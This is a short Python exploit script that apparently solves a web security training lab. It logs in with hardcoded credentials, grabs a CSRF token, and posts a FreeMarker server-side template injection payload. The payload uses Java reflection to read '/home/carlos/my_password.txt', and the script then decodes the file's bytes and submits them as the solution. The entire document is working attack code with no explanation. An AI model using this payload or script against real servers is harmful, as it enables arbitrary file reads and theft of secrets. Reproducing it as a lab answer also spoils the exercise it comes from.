import requests
import re
import sys

def get_csrf_token(session, url):
    response = session.get(url + "/login")
    if response.status_code == 200:
        match = re.search(r'name="csrf" value="(.*?)">', response.text)
        if match:
            return match.group(1)

def perform_login(session, url, csrf_token):
    payload = {
        'csrf': csrf_token,
        'username': "content-manager",
        'password': 'C0nt3ntM4n4g3r'
    }
    response = session.post(url + "/login", data=payload)
    return response

if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit(1)

    url = sys.argv[1]
    session = requests.Session()

    try:
        csrf_token = get_csrf_token(session, url)
        response = perform_login(session, url, csrf_token)
    except Exception as e:
        sys.exit(1)

    ssrf_url = url + '/product/template?productId=1'
    response = session.get(ssrf_url)
    match = re.search(r'name="csrf" value="(.*?)">', response.text)
    if match:
        csrf_token = match.group(1)

    payload = {
        'csrf': csrf_token,
        'template': '${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(\'/home/carlos/my_password.txt\').toURL().openStream().readAllBytes()?join(" ")}',
        'template-action': 'save'
    }
    response = session.post(ssrf_url, data=payload)
    secret_key_match = re.search(r'(\d{1,3}(\s+|$)){20}', response.text)
    secret_key = secret_key_match.group(0)
    text = ''.join(map(chr, map(int, secret_key.split())))
    submit_url = url + '/submitSolution'
    payload = {'answer': text}
    session.post(submit_url, data=payload)
    
